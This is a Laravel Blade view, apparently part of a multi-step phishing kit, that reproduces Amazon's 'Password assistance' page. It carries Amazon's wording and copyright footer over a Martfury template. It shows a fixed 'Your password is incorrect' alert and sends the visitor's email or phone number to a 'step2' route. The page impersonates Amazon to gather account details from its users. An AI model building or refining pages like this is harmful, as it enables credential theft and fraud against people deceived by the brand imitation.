@extends('layout.app')

@section('title', __('Martfury - Multipurpose Marketplace HTML5 Template + Admin Template'))

@section('custom_css')
    <link rel="stylesheet" href="{{ asset('/css/multi-step.css') }}">
    <link rel="stylesheet" href="{{ asset('/css/signin.css') }}">
@endsection

@section('content')


    <!-- CONTENT -->
    <div class="ps-page--single" id="about-us">
        <div class="ps-about-intro">
            <div class="container">
                <div class="ps-section__header custom-section__header">
                    <div class="row center-element">
                        <div class="col-md-12">
                            <div class="a-section none">
                                <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" role="alert">
                                    <div class="a-box-inner a-alert-container">
                                        <h4 class="a-alert-heading">There was a problem</h4>
                                        <i class="a-icon a-icon-alert"></i>
                                        <div class="a-alert-content">
                                            <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                                <li>
                                                    <span class="a-list-item">Your password is incorrect</span>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="bg-white pd-30-27">
                                <p class="title mb-15">{{ __('Password assistance')}}</p>
                                <p class="subtitle-2">Enter the email address or mobile phone number associated with your Amazon account.</p>
                                <form action="{{ route('step2') }}" method="POST">
                                    @csrf
                                    <label class="label-2">{{ __('Email or mobile phone number')}}</label>
                                    <input type="email" value="{{ old('email') }}"  name="email" class="custom-form-control" />
                                    <div class="text-danger none" id="email_error">The name field is required</div>
                                    @error('email')
                                        <div class="text-danger">{{ $message }}</div>
                                    @enderror
                                    
                                    <button type="submit" class="b-btn mt-15 mb-15">{{ __('Continue')}}</button>
                                </form>
                            </div>
                            <p class="subtitle-3">Has your email or mobile number changed?</p>
                            <p class="subtitle-2">If you no longer use the email address associated with your account, you may contact <a href="#" class="link-normal">Customer Service</a> for help restoring access to your account.</p>
                        </div>
                    </div>
                    <div class="a-divider a-divider-section">
                        <div class="a-divider-inner">
                        </div>
                    </div>
                    <div>
                        <p class="para-normal">
                            <a href="#" class="pr-30">{{ __('Conditions of Use')}}</a>
                            <a href="#" class="pr-30">{{ __('Privacy Notice')}}</a>
                            <a href="#">{{ __('Help')}}</a>
                        </p>
                    </div>
                    <div class="signin-footer">
                        <span class="signin-footer-content">© 1996-2023, Amazon.com, Inc. or its affiliates</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection

@section('custom_js')
    <!-- CLIENT-SIDE VALIDATION -->
    <script src="{{ asset('/js/validation/step2.js') }}"></script>
@endsection